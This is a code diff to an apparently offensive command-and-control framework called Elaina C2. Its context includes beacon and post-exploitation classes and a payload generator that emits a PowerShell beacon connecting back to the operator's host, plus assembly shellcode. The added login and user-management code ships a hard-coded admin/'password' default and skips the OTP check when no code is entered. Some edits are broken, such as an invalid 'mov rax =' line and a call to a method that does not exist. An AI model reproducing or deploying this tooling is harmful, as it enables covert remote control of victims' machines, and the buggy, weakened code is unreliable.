@@ -93,6 +93,7 @@ from PyQt5.QtGui import QIcon, QFont, QPixmap, QImage, QTextCharFormat, QColor, 
 from PyQt5.QtWebEngineWidgets import QWebEngineView
 from PyQt5.QtWebChannel import QWebChannel
 from PyQt5.QtWebSockets import QWebSocketServer, QWebSocket
+import pyotp
 
 warnings.filterwarnings("ignore", message="Unverified HTTPS request")
 init(autoreset=True)
@@ -106,6 +107,7 @@ BOF_DIR = "bof"
 SCRIPT_DIR = "scripts"
 PROFILE_DIR = "profiles"
 LISTENERS_FILE = "listeners.json"
+USER_DB_PATH = "users.json"
 logger = logging.getLogger("ELAINA")
 logger.setLevel(logging.DEBUG)
 console_handler = logging.StreamHandler()
@@ -113,6 +115,204 @@ console_format = logging.Formatter("\033[1;32m%(asctime)s\033[0m [\033[1;34m%(le
 console_handler.setFormatter(console_format)
 logger.addHandler(console_handler)
 log_entries = []
+
+class UserDatabase:
+    def __init__(self):
+        self.db_path = USER_DB_PATH
+        self.users = {}
+        self.load_users()
+        
+    def load_users(self):
+        if os.path.exists(self.db_path):
+            try:
+                with open(self.db_path, 'r') as f:
+                    self.users = json.load(f)
+            except:
+                self.users = {}
+        else:
+            self.create_default_admin()
+            
+    def save_users(self):
+        try:
+            with open(self.db_path, 'w') as f:
+                json.dump(self.users, f, indent=2)
+        except:
+            pass
+            
+    def create_default_admin(self):
+        salt = os.urandom(16).hex()
+        password_hash = self.hash_password("password", salt)
+        self.users["admin"] = {
+            "password_hash": password_hash,
+            "salt": salt,
+            "role": "admin",
+            "last_login": None,
+            "created_at": datetime.now().isoformat(),
+            "is_active": True,
+            "failed_attempts": 0,
+            "locked_until": None,
+            "otp_secret": pyotp.random_base32()
+        }
+        self.save_users()
+        
+    def hash_password(self, password, salt):
+        kdf = PBKDF2HMAC(
+            algorithm=hashes.SHA256(),
+            length=32,
+            salt=salt.encode(),
+            iterations=100000,
+        )
+        return kdf.derive(password.encode()).hex()
+        
+    def verify_password(self, username, password):
+        if username not in self.users:
+            return False
+            
+        user = self.users[username]
+        if not user.get("is_active", True):
+            return False
+            
+        locked_until = user.get("locked_until")
+        if locked_until and datetime.fromisoformat(locked_until) > datetime.now():
+            return False
+            
+        password_hash = self.hash_password(password, user["salt"])
+        if password_hash == user["password_hash"]:
+            self.users[username]["failed_attempts"] = 0
+            self.users[username]["locked_until"] = None
+            self.users[username]["last_login"] = datetime.now().isoformat()
+            self.save_users()
+            return True
+        else:
+            self.users[username]["failed_attempts"] = self.users[username].get("failed_attempts", 0) + 1
+            if self.users[username]["failed_attempts"] >= 5:
+                lock_time = datetime.now() + timedelta(minutes=30)
+                self.users[username]["locked_until"] = lock_time.isoformat()
+            self.save_users()
+            return False
+            
+    def add_user(self, username, password, role):
+        if username in self.users:
+            return False
+            
+        salt = os.urandom(16).hex()
+        password_hash = self.hash_password(password, salt)
+        
+        self.users[username] = {
+            "password_hash": password_hash,
+            "salt": salt,
+            "role": role,
+            "last_login": None,
+            "created_at": datetime.now().isoformat(),
+            "is_active": True,
+            "failed_attempts": 0,
+            "locked_until": None,
+            "otp_secret": pyotp.random_base32()
+        }
+        self.save_users()
+        return True
+        
+    def update_user(self, username, **kwargs):
+        if username not in self.users:
+            return False
+            
+        for key, value in kwargs.items():
+            if key in self.users[username]:
+                if key == "password":
+                    salt = os.urandom(16).hex()
+                    password_hash = self.hash_password(value, salt)
+                    self.users[username]["password_hash"] = password_hash
+                    self.users[username]["salt"] = salt
+                else:
+                    self.users[username][key] = value
+                    
+        self.save_users()
+        return True
+        
+    def delete_user(self, username):
+        if username not in self.users:
+            return False
+            
+        del self.users[username]
+        self.save_users()
+        return True
+        
+    def get_user(self, username):
+        return self.users.get(username)
+        
+    def get_all_users(self):
+        return self.users
+        
+    def verify_otp(self, username, otp_code):
+        if username not in self.users:
+            return False
+            
+        user = self.users[username]
+        otp_secret = user.get("otp_secret")
+        if not otp_secret:
+            return False
+            
+        totp = pyotp.TOTP(otp_secret)
+        return totp.verify(otp_code)
+
+class AuthenticationManager:
+    def __init__(self):
+        self.user_db = UserDatabase()
+        self.current_user = None
+        self.session_token = None
+        
+    def login(self, username, password, otp_code=None):
+        if not self.user_db.verify_password(username, password):
+            return False
+            
+        user = self.user_db.get_user(username)
+        if not user.get("is_active", True):
+            return False
+            
+        locked_until = user.get("locked_until")
+        if locked_until and datetime.fromisoformat(locked_until) > datetime.now():
+            return False
+            
+        if user.get("otp_secret") and otp_code:
+            if not self.user_db.verify_otp(username, otp_code):
+                return False
+                
+        self.current_user = username
+        self.session_token = self.generate_session_token()
+        return True
+        
+    def logout(self):
+        self.current_user = None
+        self.session_token = None
+        
+    def is_authenticated(self):
+        return self.current_user is not None
+        
+    def get_current_user(self):
+        return self.current_user
+        
+    def get_user_role(self):
+        if not self.current_user:
+            return None
+            
+        user = self.user_db.get_user(self.current_user)
+        return user.get("role") if user else None
+        
+    def generate_session_token(self):
+        return base64.b64encode(os.urandom(32)).decode()
+        
+    def register(self, username, password, role):
+        return self.user_db.add_user(username, password, role)
+        
+    def change_password(self, username, old_password, new_password):
+        if not self.user_db.verify_password(username, old_password):
+            return False
+            
+        return self.user_db.update_user(username, password=new_password)
+        
+    def reset_password(self, username, new_password):
+        return self.user_db.update_user(username, password=new_password)
+
 def log(action, target, status, detail=None):
     entry = {
         "action": action,
@@ -125,6 +325,7 @@ def log(action, target, status, detail=None):
     with open(LOG_JSON_PATH, "w") as f:
         json.dump(log_entries, f, indent=2)
     logger.info(f"{action} {target} {status} {detail or ''}")
+
 def retry(ExceptionToCheck, tries=3, delay=2, backoff=2):
     def deco_retry(f):
         @wraps(f)
@@ -141,12 +342,16 @@ def retry(ExceptionToCheck, tries=3, delay=2, backoff=2):
             return f(*args, **kwargs)
         return f_retry
     return deco_retry
+
 def random_sleep(min_s=0.5, max_s=2):
     time.sleep(random.uniform(min_s, max_s))
+
 def colorize(text, color_code):
     return f"\033[{color_code}m{text}\033[0m"
+
 def random_string(length=8):
     return ''.join(random.choice(string.ascii_lowercase) for _ in range(length))
+
 class Encryption:
     def __init__(self):
         self.algorithm = algorithms.AES(256)
@@ -182,6 +387,7 @@ class Encryption:
         
         decryptor.authenticate_additional_data(b"additional_data")
         return decryptor.update(ciphertext) + decryptor.finalize_with_tag(tag)
+
 class DomainGenerator:
     def __init__(self):
         self.legitimate_domains = [
@@ -202,6 +408,7 @@ class DomainGenerator:
             path = '/'.join(random.choices(['api', 'v1', 'v2', 'cdn', 'static', 'assets'], k=random.randint(1, 3)))
             urls.append(f"https://{domain}/{path}")
         return urls
+
 class TrafficShaper:
     def __init__(self):
         self.user_agents = [
@@ -228,6 +435,7 @@ class TrafficShaper:
         jitter = random.uniform(0, jitter_percent)
         sleep_time = base_sleep * (1 + jitter)
         time.sleep(sleep_time)
+
 class ProfileParser:
     def __init__(self):
         self.profiles = {}
@@ -363,6 +571,7 @@ class ProfileParser:
                 return False
                 
         return True
+
 class C2Profile:
     def __init__(self, profile_path=None):
         self.parser = ProfileParser()
@@ -423,6 +632,7 @@ class C2Profile:
     
     def get_process_inject_config(self):
         return self.profile.get("process-inject", {})
+
 class SleepObfuscation:
     def __init__(self, method="thread_stack"):
         self.method = method
@@ -495,6 +705,7 @@ class SleepObfuscation:
     
     def _decrypt_memory_region(self):
         pass
+
 class OPSECManager:
     def __init__(self, beacon):
         self.beacon = beacon
@@ -653,6 +864,7 @@ class OPSECManager:
             pass
             
         sys.exit(0)
+
 class BOFManager:
     def __init__(self, beacon):
         self.beacon = beacon
@@ -725,6 +937,7 @@ class BOFManager:
             })
         except Exception as e:
             return {"status": "error", "message": str(e)}
+
 class PostExploitationModule:
     def __init__(self, beacon):
         self.beacon = beacon
@@ -907,6 +1120,7 @@ class PostExploitationModule:
             "type": "shell",
             "data": wmi_command
         })
+
 class ScriptEngine:
     def __init__(self, main_window):
         self.main_window = main_window
@@ -1156,6 +1370,7 @@ class ScriptEngine:
             self.main_window.send_beacon_command(beacon_id, f"self_destruct {reason}")
             return True
         return False
+
 class TeamServer:
     def __init__(self, host, port):
         self.host = host
@@ -1453,6 +1668,7 @@ class TeamServer:
         if beacon_id:
             return self.shared_tasks.get(beacon_id, [])
         return self.shared_tasks
+
 class MemoryOperations:
     def __init__(self):
         if platform.system() == "Windows":
@@ -1672,6 +1888,7 @@ class MemoryOperations:
         self.kernel32.CloseHandle(process_handle)
         
         return True
+
 class Beacon:
     def __init__(self, c2_host, c2_port, c2_type="http", ssl_enabled=False, profile_path=None):
         self.c2_host = c2_host
@@ -2244,6 +2461,7 @@ class Beacon:
             return True
         except Exception:
             return False
+
 class StealthBeacon(Beacon):
     def __init__(self, c2_host, c2_port, c2_type="http", ssl_enabled=False, profile_path=None):
         super().__init__(c2_host, c2_port, c2_type, ssl_enabled, profile_path)
@@ -2481,6 +2699,7 @@ class StealthBeacon(Beacon):
             return True
         except Exception:
             return False
+
 class BeaconGenerator:
     def __init__(self, listener_info, parsed_profile):
         self.listener_info = listener_info
@@ -2805,9 +3024,9 @@ if __name__ == "__main__":
         http_post_config = self.parsed_profile.get("http-post", {})
         
         template = f'''# PowerShell Beacon for Elaina C2 Framework
-$C2Host = "{self.listener_info["host"]}"
-$C2Port = {self.listener_info["port"]}
-$SleepTime = 60
+ $C2Host = "{self.listener_info["host"]}"
+ $C2Port = {self.listener_info["port"]}
+ $SleepTime = 60
 function Invoke-Beacon {{
     try {{
         $client = New-Object System.Net.Sockets.TCPClient($C2Host, $C2Port)
@@ -2848,12 +3067,12 @@ function Invoke-Beacon {{
     }}
 }}
 # Start beacon in a separate thread
-$beaconThread = New-Object System.Threading.ThreadStart {{
+ $beaconThread = New-Object System.Threading.ThreadStart {{
     Invoke-Beacon
 }}
-$thread = New-Object System.Threading.Thread($beaconThread)
-$thread.IsBackground = $true
-$thread.Start()
+ $thread = New-Object System.Threading.Thread($beaconThread)
+ $thread.IsBackground = $true
+ $thread.Start()
 # Keep the process running
 try {{
     while ($true) {{
@@ -2957,7 +3176,7 @@ _start:
     xchg rdi, rax
     
     ; Connect to C2 server
-    mov rax, 0x''' + bytes(str(ipaddress.IPv4Address(self.listener_info["host"])), 'utf-8') + b'''
+    mov rax = 0x''' + bytes(str(ipaddress.IPv4Address(self.listener_info["host"])), 'utf-8') + b'''
     push rax
     mov rax = 0x''' + bytes(str(self.listener_info["port"]), 'utf-8') + b'''0000
     push rax
@@ -3017,6 +3236,7 @@ beacon_loop:
 '''
         
         return base64.b64encode(template).decode()
+
 class C2Server:
     def __init__(self, host="0.0.0.0", port=8080, ssl_enabled=False, cert_file=None, key_file=None, profile_path=None):
         self.host = host
@@ -3291,6 +3511,7 @@ class C2Server:
             self.team_server.stop()
             
         logger.info("C2 server stopped")
+
 class OutputDisplayWidget(QWidget):
     def __init__(self, parent=None):
         super().__init__(parent)
@@ -3507,6 +3728,7 @@ class OutputDisplayWidget(QWidget):
         except Exception as e:
             print(f"Error saving output: {str(e)}")
             return False
+
 class BeaconNode(QGraphicsEllipseItem):
     def __init__(self, beacon_id, beacon_info, x, y, radius=30):
         super().__init__(0, 0, radius*2, radius*2)
@@ -3528,6 +3750,7 @@ class BeaconNode(QGraphicsEllipseItem):
         
     def get_beacon_info(self):
         return self.beacon_info
+
 class BeaconConnection(QGraphicsLineItem):
     def __init__(self, source_node, dest_node):
         super().__init__()
@@ -3541,6 +3764,7 @@ class BeaconConnection(QGraphicsLineItem):
         source_pos = self.source.scenePos()
         dest_pos = self.dest.scenePos()
         self.setLine(source_pos.x(), source_pos.y(), dest_pos.x(), dest_pos.y())
+
 class BeaconGraphicsView(QGraphicsView):
     def __init__(self, parent=None):
         super().__init__(parent)
@@ -3575,6 +3799,7 @@ class BeaconGraphicsView(QGraphicsView):
         self.scene.clear()
         self.nodes = {}
         self.connections = []
+
 class BeaconInteractDialog(QDialog):
     command_sent = pyqtSignal(str, str)
     
@@ -3997,6 +4222,7 @@ class BeaconInteractDialog(QDialog):
                 self.command_input.clear()
         else:
             super().keyPressEvent(event)
+
 class MainWindow(QMainWindow):
     def __init__(self):
         super().__init__()
@@ -4007,6 +4233,7 @@ class MainWindow(QMainWindow):
         self.script_engine = None
         self.bof_manager = None
         self.listeners = {}
+        self.auth_manager = AuthenticationManager()
         self.load_listeners()
         self.init_ui()
         
@@ -4048,6 +4275,7 @@ class MainWindow(QMainWindow):
         self.create_scripts_tab()
         self.create_team_server_tab()
         self.create_view_tab()
+        self.create_user_management_tab()
         
         self.status_bar = QStatusBar()
         self.setStatusBar(self.status_bar)
@@ -4069,6 +4297,8 @@ class MainWindow(QMainWindow):
             
         if not os.path.exists(PROFILE_DIR):
             os.makedirs(PROFILE_DIR)
+        
+        self.update_user_status()
         
     def create_menu_bar(self):
         menubar = self.menuBar()
@@ -4133,6 +4363,22 @@ class MainWindow(QMainWindow):
         generate_payload_action = QAction("Generate Payload", self)
         generate_payload_action.triggered.connect(self.generate_payload)
         attacks_menu.addAction(generate_payload_action)
+        
+        user_menu = menubar.addMenu("User")
+        
+        logout_action = QAction("Logout", self)
+        logout_action.triggered.connect(self.logout)
+        user_menu.addAction(logout_action)
+        
+        change_password_action = QAction("Change Password", self)
+        change_password_action.triggered.connect(self.change_password)
+        user_menu.addAction(change_password_action)
+        
+        user_menu.addSeparator()
+        
+        user_management_action = QAction("User Management", self)
+        user_management_action.triggered.connect(lambda: self.tab_widget.setCurrentIndex(8))
+        user_menu.addAction(user_management_action)
         
         help_menu = menubar.addMenu("Help")
         
@@ -4712,6 +4958,46 @@ class MainWindow(QMainWindow):
         
         self.tab_widget.addTab(view_widget, "View")
         
+    def create_user_management_tab(self):
+        user_management_widget = QWidget()
+        layout = QVBoxLayout(user_management_widget)
+        
+        self.users_table = QTableWidget()
+        self.users_table.setColumnCount(6)
+        self.users_table.setHorizontalHeaderLabels(["Username", "Role", "Created", "Last Login", "Failed Attempts", "Status"])
+        self.users_table.horizontalHeader().setStretchLastSection(True)
+        self.users_table.setSelectionBehavior(QTableWidget.SelectRows)
+        self.users_table.setEditTriggers(QTableWidget.NoEditTriggers)
+        self.users_table.setAlternatingRowColors(True)
+        self.users_table.setSortingEnabled(True)
+        layout.addWidget(self.users_table)
+        
+        buttons_layout = QHBoxLayout()
+        
+        add_user_button = QPushButton("Add User")
+        add_user_button.clicked.connect(self.add_user)
+        buttons_layout.addWidget(add_user_button)
+        
+        edit_user_button = QPushButton("Edit User")
+        edit_user_button.clicked.connect(self.edit_user)
+        buttons_layout.addWidget(edit_user_button)
+        
+        delete_user_button = QPushButton("Delete User")
+        delete_user_button.clicked.connect(self.delete_user)
+        buttons_layout.addWidget(delete_user_button)
+        
+        reset_password_button = QPushButton("Reset Password")
+        reset_password_button.clicked.connect(self.reset_password)
+        buttons_layout.addWidget(reset_password_button)
+        
+        buttons_layout.addStretch()
+        
+        layout.addLayout(buttons_layout)
+        
+        self.update_users_table()
+        
+        self.tab_widget.addTab(user_management_widget, "User Management")
+        
     def setup_system_tray(self):
         self.tray_icon = QSystemTrayIcon(self)
         self.tray_icon.setIcon(self.style().standardIcon(QStyle.SP_ComputerIcon))
@@ -4825,6 +5111,62 @@ class MainWindow(QMainWindow):
                 self.team_server_chat_output.setTextCursor(cursor)
                 self.team_server_chat_output.ensureCursorVisible()
                 
+    def update_users_table(self):
+        user_db = UserDatabase()
+        users = user_db.get_all_users()
+        
+        self.users_table.setRowCount(len(users))
+        
+        row = 0
+        for username, user_info in users.items():
+            self.users_table.setItem(row, 0, QTableWidgetItem(username))
+            self.users_table.setItem(row, 1, QTableWidgetItem(user_info.get("role", "N/A")))
+            
+            created_at = user_info.get("created_at", "N/A")
+            if created_at and created_at != "N/A":
+                try:
+                    created_at = datetime.fromisoformat(created_at).strftime("%Y-%m-%d %H:%M:%S")
+                except:
+                    pass
+            self.users_table.setItem(row, 2, QTableWidgetItem(created_at))
+            
+            last_login = user_info.get("last_login", "N/A")
+            if last_login and last_login != "N/A":
+                try:
+                    last_login = datetime.fromisoformat(last_login).strftime("%Y-%m-%d %H:%M:%S")
+                except:
+                    pass
+            self.users_table.setItem(row, 3, QTableWidgetItem(last_login))
+            
+            failed_attempts = str(user_info.get("failed_attempts", 0))
+            self.users_table.setItem(row, 4, QTableWidgetItem(failed_attempts))
+            
+            locked_until = user_info.get("locked_until")
+            if locked_until and locked_until != "N/A":
+                try:
+                    if datetime.fromisoformat(locked_until) > datetime.now():
+                        status = "Locked"
+                    else:
+                        status = "Active" if user_info.get("is_active", True) else "Inactive"
+                except:
+                    status = "Active" if user_info.get("is_active", True) else "Inactive"
+            else:
+                status = "Active" if user_info.get("is_active", True) else "Inactive"
+            
+            self.users_table.setItem(row, 5, QTableWidgetItem(status))
+            
+            row += 1
+        
+        self.users_table.resizeColumnsToContents()
+        
+    def update_user_status(self):
+        if self.auth_manager.is_authenticated():
+            username = self.auth_manager.get_current_user()
+            role = self.auth_manager.get_user_role()
+            self.status_bar.showMessage(f"Logged in as: {username} ({role})")
+        else:
+            self.status_bar.showMessage("Not logged in")
+            
     def interact_with_beacon(self):
         selected_items = self.beacons_table.selectedItems()
         if not selected_items:
@@ -5112,7 +5454,7 @@ class MainWindow(QMainWindow):
             port = port_input.value()
             beacon_type = type_combo.currentText()
             ssl_enabled = ssl_checkbox.isChecked()
-            profile_path = profile_input.text() if profile_path.text() else None
+            profile_path = profile_input.text() if profile_input.text() else None
             sleep_time = sleep_input.value()
             jitter = jitter_input.value()
             stealth_mode = stealth_checkbox.isChecked()
@@ -6042,9 +6384,9 @@ if __name__ == "__main__":
             raise Exception("Invalid format for PowerShell payload")
         
         payload_code = f"""# PowerShell Beacon for Elaina C2 Framework
-$C2Host = "{listener_info['host']}"
-$C2Port = {listener_info['port']}
-$SleepTime = 5
+ $C2Host = "{listener_info['host']}"
+ $C2Port = {listener_info['port']}
+ $SleepTime = 5
 function Invoke-Beacon {{
     try {{
         $client = New-Object System.Net.Sockets.TCPClient($C2Host, $C2Port)
@@ -6085,12 +6427,12 @@ function Invoke-Beacon {{
     }}
 }}
 # Start beacon in a separate thread
-$beaconThread = New-Object System.Threading.ThreadStart {{
+ $beaconThread = New-Object System.Threading.ThreadStart {{
     Invoke-Beacon
 }}
-$thread = New-Object System.Threading.Thread($beaconThread)
-$thread.IsBackground = $true
-$thread.Start()
+ $thread = New-Object System.Threading.Thread($beaconThread)
+ $thread.IsBackground = $true
+ $thread.Start()
 # Keep the process running
 try {{
     while ($true) {{
@@ -6718,6 +7060,266 @@ beacon_loop:
                 QMessageBox.information(self, "Success", f"All output saved to {file_path}")
             except Exception as e:
                 QMessageBox.critical(self, "Error", f"Failed to save output: {str(e)}")
+                
+    def add_user(self):
+        dialog = QDialog(self)
+        dialog.setWindowTitle("Add User")
+        layout = QFormLayout(dialog)
+        
+        username_input = QLineEdit()
+        layout.addRow("Username:", username_input)
+        
+        password_input = QLineEdit()
+        password_input.setEchoMode(QLineEdit.Password)
+        layout.addRow("Password:", password_input)
+        
+        confirm_password_input = QLineEdit()
+        confirm_password_input.setEchoMode(QLineEdit.Password)
+        layout.addRow("Confirm Password:", confirm_password_input)
+        
+        role_combo = QComboBox()
+        role_combo.addItems(["admin", "operator", "viewer"])
+        layout.addRow("Role:", role_combo)
+        
+        button_box = QDialogButtonBox(QDialogButtonBox.Ok | QDialogButtonBox.Cancel)
+        layout.addRow(button_box)
+        
+        if button_box.exec_() == QDialog.Accepted:
+            username = username_input.text()
+            password = password_input.text()
+            confirm_password = confirm_password_input.text()
+            role = role_combo.currentText()
+            
+            if username and password and role:
+                if password != confirm_password:
+                    QMessageBox.warning(self, "Error", "Passwords do not match")
+                    return
+                
+                if self.auth_manager.register(username, password, role):
+                    self.update_users_table()
+                    
+                    self.log_entries.append({
+                        "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
+                        "action": "add_user",
+                        "target": username,
+                        "status": "success"
+                    })
+                    
+                    self.status_bar.showMessage(f"User {username} added successfully")
+                    
+                    QMessageBox.information(self, "Success", f"User {username} added successfully")
+                else:
+                    QMessageBox.warning(self, "Error", "Failed to add user")
+            else:
+                QMessageBox.warning(self, "Error", "All fields are required")
+                
+    def edit_user(self):
+        selected_items = self.users_table.selectedItems()
+        if not selected_items:
+            QMessageBox.warning(self, "No Selection", "Please select a user to edit.")
+            return
+        
+        row = selected_items[0].row()
+        username = self.users_table.item(row, 0).text()
+        
+        user_db = UserDatabase()
+        user_info = user_db.get_user(username)
+        
+        if not user_info:
+            QMessageBox.warning(self, "Error", f"User {username} not found")
+            return
+        
+        dialog = QDialog(self)
+        dialog.setWindowTitle(f"Edit User {username}")
+        layout = QFormLayout(dialog)
+        
+        role_combo = QComboBox()
+        role_combo.addItems(["admin", "operator", "viewer"])
+        role_combo.setCurrentText(user_info.get("role", "viewer"))
+        layout.addRow("Role:", role_combo)
+        
+        is_active_checkbox = QCheckBox()
+        is_active_checkbox.setChecked(user_info.get("is_active", True))
+        layout.addRow("Active:", is_active_checkbox)
+        
+        reset_failed_attempts_button = QPushButton("Reset Failed Attempts")
+        reset_failed_attempts_button.clicked.connect(lambda: user_db.update_user(username, failed_attempts=0))
+        layout.addRow("", reset_failed_attempts_button)
+        
+        unlock_button = QPushButton("Unlock Account")
+        unlock_button.clicked.connect(lambda: user_db.update_user(username, locked_until=None))
+        layout.addRow("", unlock_button)
+        
+        button_box = QDialogButtonBox(QDialogButtonBox.Ok | QDialogButtonBox.Cancel)
+        layout.addRow(button_box)
+        
+        if button_box.exec_() == QDialog.Accepted:
+            role = role_combo.currentText()
+            is_active = is_active_checkbox.isChecked()
+            
+            if user_db.update_user(username, role=role, is_active=is_active):
+                self.update_users_table()
+                
+                self.log_entries.append({
+                    "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
+                    "action": "edit_user",
+                    "target": username,
+                    "status": "success"
+                })
+                
+                self.status_bar.showMessage(f"User {username} updated successfully")
+                
+                QMessageBox.information(self, "Success", f"User {username} updated successfully")
+            else:
+                QMessageBox.warning(self, "Error", "Failed to update user")
+                
+    def delete_user(self):
+        selected_items = self.users_table.selectedItems()
+        if not selected_items:
+            QMessageBox.warning(self, "No Selection", "Please select a user to delete.")
+            return
+        
+        row = selected_items[0].row()
+        username = self.users_table.item(row, 0).text()
+        
+        if username == self.auth_manager.get_current_user():
+            QMessageBox.warning(self, "Error", "You cannot delete your own account")
+            return
+        
+        reply = QMessageBox.question(self, "Confirm Deletion", 
+                                    f"Are you sure you want to delete user {username}?",
+                                    QMessageBox.Yes | QMessageBox.No)
+        
+        if reply == QMessageBox.Yes:
+            user_db = UserDatabase()
+            if user_db.delete_user(username):
+                self.update_users_table()
+                
+                self.log_entries.append({
+                    "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
+                    "action": "delete_user",
+                    "target": username,
+                    "status": "success"
+                })
+                
+                self.status_bar.showMessage(f"User {username} deleted successfully")
+                
+                QMessageBox.information(self, "Success", f"User {username} deleted successfully")
+            else:
+                QMessageBox.warning(self, "Error", "Failed to delete user")
+                
+    def reset_password(self):
+        selected_items = self.users_table.selectedItems()
+        if not selected_items:
+            QMessageBox.warning(self, "No Selection", "Please select a user to reset password.")
+            return
+        
+        row = selected_items[0].row()
+        username = self.users_table.item(row, 0).text()
+        
+        dialog = QDialog(self)
+        dialog.setWindowTitle(f"Reset Password for {username}")
+        layout = QFormLayout(dialog)
+        
+        new_password_input = QLineEdit()
+        new_password_input.setEchoMode(QLineEdit.Password)
+        layout.addRow("New Password:", new_password_input)
+        
+        confirm_password_input = QLineEdit()
+        confirm_password_input.setEchoMode(QLineEdit.Password)
+        layout.addRow("Confirm Password:", confirm_password_input)
+        
+        button_box = QDialogButtonBox(QDialogButtonBox.Ok | QDialogButtonBox.Cancel)
+        layout.addRow(button_box)
+        
+        if button_box.exec_() == QDialog.Accepted:
+            new_password = new_password_input.text()
+            confirm_password = confirm_password_input.text()
+            
+            if new_password and confirm_password:
+                if new_password != confirm_password:
+                    QMessageBox.warning(self, "Error", "Passwords do not match")
+                    return
+                
+                user_db = UserDatabase()
+                if user_db.reset_password(username, new_password):
+                    self.update_users_table()
+                    
+                    self.log_entries.append({
+                        "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
+                        "action": "reset_password",
+                        "target": username,
+                        "status": "success"
+                    })
+                    
+                    self.status_bar.showMessage(f"Password for {username} reset successfully")
+                    
+                    QMessageBox.information(self, "Success", f"Password for {username} reset successfully")
+                else:
+                    QMessageBox.warning(self, "Error", "Failed to reset password")
+            else:
+                QMessageBox.warning(self, "Error", "All fields are required")
+                
+    def change_password(self):
+        current_user = self.auth_manager.get_current_user()
+        if not current_user:
+            QMessageBox.warning(self, "Error", "No user logged in")
+            return
+        
+        dialog = QDialog(self)
+        dialog.setWindowTitle("Change Password")
+        layout = QFormLayout(dialog)
+        
+        current_password_input = QLineEdit()
+        current_password_input.setEchoMode(QLineEdit.Password)
+        layout.addRow("Current Password:", current_password_input)
+        
+        new_password_input = QLineEdit()
+        new_password_input.setEchoMode(QLineEdit.Password)
+        layout.addRow("New Password:", new_password_input)
+        
+        confirm_password_input = QLineEdit()
+        confirm_password_input.setEchoMode(QLineEdit.Password)
+        layout.addRow("Confirm Password:", confirm_password_input)
+        
+        button_box = QDialogButtonBox(QDialogButtonBox.Ok | QDialogButtonBox.Cancel)
+        layout.addRow(button_box)
+        
+        if button_box.exec_() == QDialog.Accepted:
+            current_password = current_password_input.text()
+            new_password = new_password_input.text()
+            confirm_password = confirm_password_input.text()
+            
+            if current_password and new_password and confirm_password:
+                if new_password != confirm_password:
+                    QMessageBox.warning(self, "Error", "New passwords do not match")
+                    return
+                
+                if self.auth_manager.change_password(current_user, current_password, new_password):
+                    self.log_entries.append({
+                        "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
+                        "action": "change_password",
+                        "target": current_user,
+                        "status": "success"
+                    })
+                    
+                    self.status_bar.showMessage("Password changed successfully")
+                    
+                    QMessageBox.information(self, "Success", "Password changed successfully")
+                else:
+                    QMessageBox.warning(self, "Error", "Failed to change password")
+            else:
+                QMessageBox.warning(self, "Error", "All fields are required")
+                
+    def logout(self):
+        reply = QMessageBox.question(self, "Confirm Logout", 
+                                    "Are you sure you want to logout?",
+                                    QMessageBox.Yes | QMessageBox.No)
+        
+        if reply == QMessageBox.Yes:
+            self.auth_manager.logout()
+            self.close()
+
 class EnhancedMainWindow(MainWindow):
     def __init__(self):
         super().__init__()
@@ -6961,6 +7563,144 @@ class EnhancedMainWindow(MainWindow):
                     network_info += f"{port['protocol']:<8} {port['address']:<20} {port['port']:<12} {port['state']:<12}\n"
             
             self.output_display.add_network_output(network_info, "#0000FF")
+
+class LoginDialog(QDialog):
+    login_successful = pyqtSignal(str, str)
+    
+    def __init__(self, parent=None):
+        super().__init__(parent)
+        self.setWindowTitle("Elaina C2 Framework - Login")
+        self.setMinimumWidth(400)
+        self.setWindowFlags(Qt.Dialog | Qt.WindowCloseButtonHint | Qt.CustomizeWindowHint)
+        self.init_ui()
+        
+    def init_ui(self):
+        layout = QVBoxLayout()
+        
+        title_layout = QHBoxLayout()
+        title_label = QLabel("ELAINA C2 FRAMEWORK")
+        title_label.setAlignment(Qt.AlignCenter)
+        title_label.setStyleSheet("font-size: 18px; font-weight: bold; color: #333;")
+        title_layout.addWidget(title_label)
+        layout.addLayout(title_layout)
+        
+        layout.addWidget(QLabel(""))
+        
+        self.tab_widget = QTabWidget()
+        layout.addWidget(self.tab_widget)
+        
+        # Login Tab
+        login_tab = QWidget()
+        login_layout = QVBoxLayout(login_tab)
+        
+        form_layout = QFormLayout()
+        
+        self.username_input = QLineEdit()
+        self.username_input.setPlaceholderText("Username")
+        form_layout.addRow("Username:", self.username_input)
+        
+        self.password_input = QLineEdit()
+        self.password_input.setPlaceholderText("Password")
+        self.password_input.setEchoMode(QLineEdit.Password)
+        form_layout.addRow("Password:", self.password_input)
+        
+        self.otp_input = QLineEdit()
+        self.otp_input.setPlaceholderText("OTP (if enabled)")
+        form_layout.addRow("OTP:", self.otp_input)
+        
+        login_layout.addLayout(form_layout)
+        
+        login_button = QPushButton("Login")
+        login_button.clicked.connect(self.attempt_login)
+        login_layout.addWidget(login_button)
+        
+        self.tab_widget.addTab(login_tab, "Login")
+        
+        # Register Tab
+        register_tab = QWidget()
+        register_layout = QVBoxLayout(register_tab)
+        
+        register_form_layout = QFormLayout()
+        
+        self.reg_username_input = QLineEdit()
+        self.reg_username_input.setPlaceholderText("Username")
+        register_form_layout.addRow("Username:", self.reg_username_input)
+        
+        self.reg_password_input = QLineEdit()
+        self.reg_password_input.setPlaceholderText("Password")
+        self.reg_password_input.setEchoMode(QLineEdit.Password)
+        register_form_layout.addRow("Password:", self.reg_password_input)
+        
+        self.reg_confirm_password_input = QLineEdit()
+        self.reg_confirm_password_input.setPlaceholderText("Confirm Password")
+        self.reg_confirm_password_input.setEchoMode(QLineEdit.Password)
+        register_form_layout.addRow("Confirm Password:", self.reg_confirm_password_input)
+        
+        self.reg_role_combo = QComboBox()
+        self.reg_role_combo.addItems(["operator", "viewer"])
+        register_form_layout.addRow("Role:", self.reg_role_combo)
+        
+        register_layout.addLayout(register_form_layout)
+        
+        register_button = QPushButton("Register")
+        register_button.clicked.connect(self.attempt_register)
+        register_layout.addWidget(register_button)
+        
+        self.tab_widget.addTab(register_tab, "Register")
+        
+        layout.addWidget(QLabel(""))
+        
+        self.status_label = QLabel("")
+        self.status_label.setAlignment(Qt.AlignCenter)
+        self.status_label.setStyleSheet("color: red;")
+        layout.addWidget(self.status_label)
+        
+        self.setLayout(layout)
+        
+        self.username_input.setFocus()
+        
+        # Set default credentials for demo purposes
+        self.username_input.setText("admin")
+        self.password_input.setText("password")
+        
+    def attempt_login(self):
+        username = self.username_input.text()
